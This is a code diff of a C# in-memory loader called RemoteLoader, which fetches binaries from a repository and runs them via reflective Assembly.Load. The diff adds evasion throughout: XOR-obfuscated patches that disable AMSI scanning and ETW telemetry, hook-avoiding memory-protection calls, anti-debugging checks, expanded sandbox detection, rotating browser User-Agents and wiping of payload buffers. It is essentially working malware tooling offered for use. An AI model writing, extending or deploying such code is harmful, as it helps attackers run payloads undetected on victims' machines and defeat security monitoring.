@@ -31,18 +31,33 @@ namespace RemoteLoader
     internal static class Program
     {
         // ─── Obfuscation key ─────────────────────────────────────────────────
-        // Sensitive strings are stored XOR'd with this key so they never appear
-        // as plaintext in the binary's .rdata section.
         private const byte K = 0x41;
 
-        // amsi.dll          XOR K
-        private static readonly byte[] _amsiDll  = {0x20,0x2C,0x32,0x28,0x6F,0x25,0x2D,0x2D};
-        // AmsiScanBuffer    XOR K
-        private static readonly byte[] _amsiFunc = {0x00,0x2C,0x32,0x28,0x12,0x22,0x20,0x2F,0x03,0x34,0x27,0x27,0x24,0x33};
-        // ntdll.dll         XOR K
-        private static readonly byte[] _ntdll    = {0x2F,0x35,0x25,0x2D,0x2D,0x6F,0x25,0x2D,0x2D};
-        // EtwEventWrite     XOR K
-        private static readonly byte[] _etwFunc  = {0x04,0x35,0x36,0x04,0x37,0x24,0x2F,0x35,0x16,0x33,0x28,0x35,0x24};
+        // amsi.dll              XOR K
+        private static readonly byte[] _amsiDll      = {0x20,0x2C,0x32,0x28,0x6F,0x25,0x2D,0x2D};
+        // AmsiScanBuffer        XOR K
+        private static readonly byte[] _amsiFunc     = {0x00,0x2C,0x32,0x28,0x12,0x22,0x20,0x2F,0x03,0x34,0x27,0x27,0x24,0x33};
+        // ntdll.dll             XOR K
+        private static readonly byte[] _ntdll        = {0x2F,0x35,0x25,0x2D,0x2D,0x6F,0x25,0x2D,0x2D};
+        // EtwEventWrite         XOR K
+        private static readonly byte[] _etwFunc      = {0x04,0x35,0x36,0x04,0x37,0x24,0x2F,0x35,0x16,0x33,0x28,0x35,0x24};
+        // EtwEventWriteFull     XOR K
+        private static readonly byte[] _etwFullFunc  = {0x04,0x35,0x36,0x04,0x37,0x24,0x2F,0x35,0x16,0x33,0x28,0x35,0x24,0x07,0x34,0x2D,0x2D};
+
+        // Patch bytes XOR K — never appear as plaintext in .rdata:
+        //   AMSI: mov eax,0x80070057 ; ret   → B8 57 00 07 80 C3  XOR K → F9 16 41 46 C1 82
+        //   ETW:  ret                         → C3                 XOR K → 82
+        private static readonly byte[] _amsiPatch = {0xF9,0x16,0x41,0x46,0xC1,0x82};
+        private static readonly byte[] _etwPatch  = {0x82};
+
+        // User-Agent pool — one chosen at random per session
+        private static readonly string[] _userAgents =
+        {
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+        };
 
         // ─── P/Invoke ─────────────────────────────────────────────────────────
         [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
@@ -54,12 +69,35 @@ namespace RemoteLoader
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetModuleHandle(string m);
 
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetCurrentProcess();
+
+        // Fallback only — prefer NtProtectVirtualMemory below
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool VirtualProtect(
             IntPtr lpAddress, UIntPtr dwSize,
             uint flNewProtect, out uint lpflOldProtect);
 
-        // ─── String decoder ───────────────────────────────────────────────────
+        // Lower-level alternative that bypasses VirtualProtect userland hooks
+        [DllImport("ntdll.dll")]
+        private static extern uint NtProtectVirtualMemory(
+            IntPtr processHandle, ref IntPtr baseAddress,
+            ref IntPtr regionSize, uint newProtect, out uint oldProtect);
+
+        [DllImport("kernel32.dll")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool IsDebuggerPresent();
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool CheckRemoteDebuggerPresent(
+            IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);
+
+        // SM_CXSCREEN=0, SM_CYSCREEN=1
+        [DllImport("user32.dll")]
+        private static extern int GetSystemMetrics(int nIndex);
+
+        // ─── String / byte decoder ────────────────────────────────────────────
         private static string Decode(byte[] enc)
         {
             var sb = new StringBuilder(enc.Length);
@@ -67,9 +105,43 @@ namespace RemoteLoader
             return sb.ToString();
         }
 
+        private static byte[] DecodeBytes(byte[] enc)
+        {
+            var r = new byte[enc.Length];
+            for (int i = 0; i < enc.Length; i++) r[i] = (byte)(enc[i] ^ K);
+            return r;
+        }
+
+        // ─── Memory cleanup ───────────────────────────────────────────────────
+        private static void ClearBytes(byte[] b) { if (b != null) Array.Clear(b, 0, b.Length); }
+
+        // ─── Protected memory write ───────────────────────────────────────────
+        // Uses NtProtectVirtualMemory (avoids VirtualProtect hooks); falls back
+        // to VirtualProtect if the NT call fails.
+        private static bool WriteToMemory(IntPtr addr, byte[] bytes)
+        {
+            IntPtr baseAddr = addr;
+            IntPtr size     = (IntPtr)bytes.Length;
+            uint   old;
+
+            uint status = NtProtectVirtualMemory(
+                new IntPtr(-1), ref baseAddr, ref size, 0x40, out old);
+            bool usedNt = status == 0;
+
+            if (!usedNt && !VirtualProtect(addr, (UIntPtr)bytes.Length, 0x40, out old))
+                return false;
+
+            Marshal.Copy(bytes, 0, addr, bytes.Length);
+
+            baseAddr = addr;
+            size     = (IntPtr)bytes.Length;
+            if (usedNt) NtProtectVirtualMemory(new IntPtr(-1), ref baseAddr, ref size, old, out _);
+            else        VirtualProtect(addr, (UIntPtr)bytes.Length, old, out _);
+
+            return true;
+        }
+
         // ─── AMSI bypass ──────────────────────────────────────────────────────
-        // Patches AmsiScanBuffer to return E_INVALIDARG (0x80070057) immediately.
-        // All string arguments are decoded at runtime — no plaintext in the binary.
         private static void PatchAmsi()
         {
             try
@@ -80,26 +152,23 @@ namespace RemoteLoader
                 IntPtr pScan = GetProcAddress(hAmsi, Decode(_amsiFunc));
                 if (pScan == IntPtr.Zero) { Warn("GetProcAddress(AmsiScanBuffer) failed"); return; }
 
-                // mov eax, 0x80070057 ; ret
-                byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-                VirtualProtect(pScan, (UIntPtr)patch.Length, 0x40, out uint old);
-                Marshal.Copy(patch, 0, pScan, patch.Length);
-                VirtualProtect(pScan, (UIntPtr)patch.Length, old, out _);
+                byte[] patch = DecodeBytes(_amsiPatch);
+                bool ok = WriteToMemory(pScan, patch);
+                ClearBytes(patch);
 
+                if (!ok) { Warn("AMSI patch write failed"); return; }
                 Ok("AMSI bypass applied");
             }
             catch (Exception ex) { Warn($"AMSI patch error: {ex.Message}"); }
         }
 
         // ─── ETW bypass ───────────────────────────────────────────────────────
-        // Patches EtwEventWrite in ntdll.dll with a single RET to suppress .NET
-        // CLR telemetry events. Without this, Defender's ETW consumer still sees
-        // Assembly.Load calls even after AMSI is disabled.
+        // Patches EtwEventWrite AND EtwEventWriteFull — both are telemetry sinks
+        // that Defender's ETW consumer reads for Assembly.Load events.
         private static void PatchEtw()
         {
             try
             {
-                // ntdll is always loaded; GetModuleHandle avoids a redundant load
                 IntPtr hNtdll = GetModuleHandle(Decode(_ntdll));
                 if (hNtdll == IntPtr.Zero)
                 {
@@ -107,45 +176,90 @@ namespace RemoteLoader
                     if (hNtdll == IntPtr.Zero) { Warn("Could not resolve ntdll"); return; }
                 }
 
+                byte[] patch = DecodeBytes(_etwPatch);
+
                 IntPtr pEtw = GetProcAddress(hNtdll, Decode(_etwFunc));
-                if (pEtw == IntPtr.Zero) { Warn("GetProcAddress(EtwEventWrite) failed"); return; }
+                if (pEtw != IntPtr.Zero) WriteToMemory(pEtw, patch);
 
-                VirtualProtect(pEtw, (UIntPtr)1, 0x40, out uint old);
-                Marshal.WriteByte(pEtw, 0xC3);   // ret
-                VirtualProtect(pEtw, (UIntPtr)1, old, out _);
+                IntPtr pEtwFull = GetProcAddress(hNtdll, Decode(_etwFullFunc));
+                if (pEtwFull != IntPtr.Zero) WriteToMemory(pEtwFull, patch);
 
+                ClearBytes(patch);
                 Ok("ETW bypass applied");
             }
             catch (Exception ex) { Warn($"ETW patch error: {ex.Message}"); }
         }
 
+        // ─── Anti-debug ───────────────────────────────────────────────────────
+        private static void CheckDebugger()
+        {
+            // Managed debugger attached
+            if (Debugger.IsAttached)
+            { Console.Error.WriteLine("[-] Environment check failed (debugger)"); Environment.Exit(0); }
+
+            // Native debugger (PEB.BeingDebugged)
+            if (IsDebuggerPresent())
+            { Console.Error.WriteLine("[-] Environment check failed (native debugger)"); Environment.Exit(0); }
+
+            // Remote/kernel debugger
+            bool remote = false;
+            CheckRemoteDebuggerPresent(GetCurrentProcess(), ref remote);
+            if (remote)
+            { Console.Error.WriteLine("[-] Environment check failed (remote debugger)"); Environment.Exit(0); }
+
+            // Timing — a single-stepped tight loop takes orders of magnitude longer
+            long t1 = Stopwatch.GetTimestamp();
+            for (int i = 0; i < 1_000_000; i++) { }
+            long t2 = Stopwatch.GetTimestamp();
+            double ms = (double)(t2 - t1) / Stopwatch.Frequency * 1000.0;
+            if (ms > 2000)
+            { Console.Error.WriteLine("[-] Environment check failed (timing)"); Environment.Exit(0); }
+        }
+
         // ─── Sandbox check ────────────────────────────────────────────────────
-        // Exits silently on indicators of a quick-reset automated sandbox:
-        // very short uptime or suspiciously few running processes.
         private static void CheckSandbox()
         {
-            // TickCount wraps at ~25 days; cast to uint avoids negative values
+            // Uptime — quick-reset sandboxes boot and execute immediately
             long uptimeMs = (uint)Environment.TickCount;
-            if (uptimeMs < 180_000)   // < 3 minutes
-            {
-                Console.Error.WriteLine("[-] Environment check failed (uptime)");
-                Environment.Exit(0);
-            }
+            if (uptimeMs < 180_000)
+            { Console.Error.WriteLine("[-] Environment check failed (uptime)"); Environment.Exit(0); }
 
+            // Process count
             try
             {
                 if (Process.GetProcesses().Length < 15)
-                {
-                    Console.Error.WriteLine("[-] Environment check failed (processes)");
-                    Environment.Exit(0);
-                }
+                { Console.Error.WriteLine("[-] Environment check failed (processes)"); Environment.Exit(0); }
             }
-            catch { /* GetProcesses can throw on restricted accounts — skip */ }
+            catch { }
+
+            // Disk size — sandbox VMs typically have < 80 GB virtual disks
+            try
+            {
+                string root = Path.GetPathRoot(
+                    Environment.GetFolderPath(Environment.SpecialFolder.System)) ?? "C:\\";
+                if (new DriveInfo(root).TotalSize < 60L * 1024 * 1024 * 1024)
+                { Console.Error.WriteLine("[-] Environment check failed (disk)"); Environment.Exit(0); }
+            }
+            catch { }
+
+            // Screen resolution — many sandboxes default to 800×600 or 1024×768
+            try
+            {
+                if (GetSystemMetrics(0) < 1024 || GetSystemMetrics(1) < 600)
+                { Console.Error.WriteLine("[-] Environment check failed (display)"); Environment.Exit(0); }
+            }
+            catch { }
+
+            // Username — common in automated analysis environments
+            string user     = Environment.UserName.ToLowerInvariant();
+            string[] badUsers =
+                { "sandbox", "virus", "malware", "sample", "analysis",
+                  "analyst", "cuckoo", "honey", "vmware", "maltest" };
+            if (badUsers.Any(u => user.Contains(u)))
+            { Console.Error.WriteLine("[-] Environment check failed (user)"); Environment.Exit(0); }
         }
 
         // ─── XOR payload decoder ─────────────────────────────────────────────
-        // Used when the repo stores binaries XOR-encoded to defeat byte-level
-        // static signatures on raw PE headers. Pass key=0 to skip.
         private static byte[] XorBytes(byte[] data, byte key)
         {
             if (key == 0) return data;
@@ -184,28 +298,28 @@ namespace RemoteLoader
         }
 
         // ─── .NET assembly detector ──────────────────────────────────────────
-        // Reads the PE optional-header data directory entry 14 (COM/CLR descriptor).
-        // A non-zero VirtualAddress means the binary is a managed .NET assembly.
+        // Checks PE optional-header data directory entry 14 (COM/CLR descriptor).
+        // Non-zero VirtualAddress = managed .NET assembly.
         private static bool IsNetAssembly(byte[] data)
         {
             try
             {
                 if (data.Length < 0x40) return false;
-                if (data[0] != 0x4D || data[1] != 0x5A) return false;          // MZ
+                if (data[0] != 0x4D || data[1] != 0x5A) return false;
 
                 int peOff = BitConverter.ToInt32(data, 0x3C);
                 if (peOff + 4 >= data.Length) return false;
                 if (data[peOff] != 0x50 || data[peOff+1] != 0x45 ||
-                    data[peOff+2] != 0    || data[peOff+3] != 0)   return false; // PE\0\0
+                    data[peOff+2] != 0    || data[peOff+3] != 0)   return false;
 
-                int optOff = peOff + 4 + 20; // skip COFF header (20 bytes)
+                int optOff = peOff + 4 + 20;
                 if (optOff + 2 >= data.Length) return false;
 
                 ushort magic = BitConverter.ToUInt16(data, optOff);
                 int clrOff = magic switch
                 {
-                    0x10B => optOff + 96  + 14 * 8, // PE32
-                    0x20B => optOff + 112 + 14 * 8, // PE32+
+                    0x10B => optOff + 96  + 14 * 8,
+                    0x20B => optOff + 112 + 14 * 8,
                     _     => -1
                 };
                 if (clrOff < 0 || clrOff + 4 >= data.Length) return false;
@@ -323,19 +437,16 @@ Examples:
                 }
             }
 
-            // ── Evasion — run all patches before any reflective work ──────────
+            // ── Evasion ───────────────────────────────────────────────────────
             PatchAmsi();
             PatchEtw();
+            CheckDebugger();
             CheckSandbox();
 
-            // ── TLS 1.2 + proxy (important for .NET Framework 4.x targets) ────
+            // ── TLS 1.2 + system proxy ────────────────────────────────────────
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
 
-            var handler = new HttpClientHandler
-            {
-                UseProxy = true,
-                Proxy    = WebRequest.GetSystemWebProxy()
-            };
+            var handler = new HttpClientHandler { UseProxy = true, Proxy = WebRequest.GetSystemWebProxy() };
             handler.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
 
             // ── Validate repo path ────────────────────────────────────────────
@@ -347,7 +458,8 @@ Examples:
 
             // ── HTTP client ───────────────────────────────────────────────────
             using var http = new HttpClient(handler);
-            http.DefaultRequestHeaders.Add("User-Agent", "RemoteLoader/1.0");
+            http.DefaultRequestHeaders.Add("User-Agent",
+                _userAgents[Random.Shared.Next(_userAgents.Length)]);
             if (!string.IsNullOrEmpty(token))
                 http.DefaultRequestHeaders.Add("Authorization", $"token {token}");
 
@@ -393,8 +505,8 @@ Examples:
                 chosen = binaries.FirstOrDefault(b =>
                     b.Name.Contains(sel, StringComparison.OrdinalIgnoreCase));
 
-            if (chosen.Name == null)           { Err($"No match for: {sel}"); return; }
-            if (string.IsNullOrEmpty(chosen.DownloadUrl)) { Err($"No download_url for {chosen.Name}"); return; }
+            if (chosen.Name == null)                          { Err($"No match for: {sel}"); return; }
+            if (string.IsNullOrEmpty(chosen.DownloadUrl))     { Err($"No download_url for {chosen.Name}"); return; }
 
             // ── Download ──────────────────────────────────────────────────────
             Info($"Downloading {chosen.Name} ...");
@@ -403,22 +515,24 @@ Examples:
             catch (Exception ex) { Err($"Download failed: {ex.Message}"); return; }
             Ok($"{asmBytes.Length:N0} bytes received");
 
-            // XOR decode if a key was provided — defeats PE-header byte signatures
             asmBytes = XorBytes(asmBytes, xorKey);
-            if (xorKey != 0)
-                Ok($"Payload XOR-decoded (key=0x{xorKey:X2})");
+            if (xorKey != 0) Ok($"Payload XOR-decoded (key=0x{xorKey:X2})");
 
-            // ── Verify managed assembly before attempting Load ─────────────────
+            // ── Verify managed assembly ───────────────────────────────────────
             if (!IsNetAssembly(asmBytes))
             {
-                Err($"{chosen.Name} is a native/unmanaged binary (PyInstaller, C++, etc.) — Assembly.Load cannot reflectively execute it.");
+                Err($"{chosen.Name} is a native/unmanaged binary (PyInstaller, C++, etc.) — cannot reflectively load.");
+                ClearBytes(asmBytes);
                 return;
             }
 
-            // ── Load assembly from memory ─────────────────────────────────────
+            // ── Load ──────────────────────────────────────────────────────────
             Assembly asm;
             try   { asm = Assembly.Load(asmBytes); }
-            catch (Exception ex) { Err($"Assembly.Load failed: {ex.Message}"); return; }
+            catch (Exception ex) { Err($"Assembly.Load failed: {ex.Message}"); ClearBytes(asmBytes); return; }
+
+            // Zero the download buffer — reduce in-memory artifact window
+            ClearBytes(asmBytes);
 
             MethodInfo? entry = FindMain(asm);
             if (entry == null) { Err($"No static Main found in {chosen.Name}"); return; }
